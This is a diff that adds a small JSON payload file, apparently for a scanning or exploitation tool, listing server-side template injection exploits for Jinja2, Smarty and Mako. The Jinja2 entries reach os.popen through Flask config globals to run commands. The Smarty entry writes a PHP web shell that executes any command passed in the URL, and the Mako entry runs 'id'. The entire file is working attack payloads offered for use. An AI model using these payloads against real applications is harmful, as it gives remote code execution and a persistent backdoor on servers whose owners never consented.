@@ -1,0 +1,14 @@
+{"Mas_Templates":[
+  {"Name_Teamplates": "Jinja2",
+  "Exploits":
+    {
+      "ex1": "{{ config.__class__.from_envvar.__globals__.__builtins__.__import__(\"os\").popen(\"ls\").read() }}",
+      "ex2": "{{ config.__class__.from_envvar[\"__globals__\"][\"__builtins__\"][\"__import__\"](\"os\").popen(\"ls\").read() }}",
+      "ex3": " {{ (config|attr(\"__class__\")).from_envvar[\"__globals__\"][\"__builtins__\"][\"__import__\"](\"os\").popen(\"ls\").read() }}"
+    }},
+  {"Name_Teamplates": "Smarty",
+    "Exploits": {"ex1": "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}"}},
+  {"Name_Teamplates": "Mako",
+    "Exploits": {"ex1": "<%\nimport os\nx=os.popen('id').read()\n%>\n${x}"}}
+]
+}
